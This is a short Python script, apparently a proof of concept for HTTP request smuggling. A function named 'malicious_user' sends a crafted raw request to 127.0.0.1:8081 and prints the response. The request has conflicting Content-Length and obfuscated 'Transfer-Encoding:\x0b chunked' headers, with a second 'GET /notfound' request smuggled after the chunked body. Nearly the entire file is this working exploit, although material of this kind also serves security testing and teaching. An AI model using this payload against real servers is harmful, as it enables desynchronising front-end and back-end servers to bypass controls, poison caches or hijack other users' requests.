from conn import BytesIOSocket , ShockerSocket
from rich import print

def malicious_user(payload , host , port ):
    print("[Attacker]" ,  ":vampire:")
    s = ShockerSocket(host , port)
    s.plug()
    s.send(payload)
    result = s.recv()
    resp_obj = BytesIOSocket.response_from_bytes(result)
    print("[bold red]Headers[/bold red]\n" , resp_obj.getheaders())
    print("[bold red]Data[/bold red]\n" , resp_obj.data)



"""
'GET / HTTP/1.1\r\n'\
'Host: 127.0.0.1:8081\r\n'\
'Content-Length: 45\r\n'\
'Connection: keep-alive\r\n'\
'Transfer-Encoding:\x0b chunked\r\n'\
'\r\n'\
'1\r\n'\
'A\r\n'\
'0\r\n'\
'\r\n'\
'GET /notfound HTTP/1.1\r\n'\
'X-Foo: bar'
"""

payload = b"GET / HTTP/1.1\r\nHost: 127.0.0.1:8081\r\nContent-Length: 45\r\nConnection: keep-alive\r\nTransfer-Encoding:\x0b chunked\r\n\r\n1\r\nA\r\n0\r\n\r\nGET /notfound HTTP/1.1\r\nX-Foo: bar"


malicious_user(payload , "127.0.0.1" ,8081)


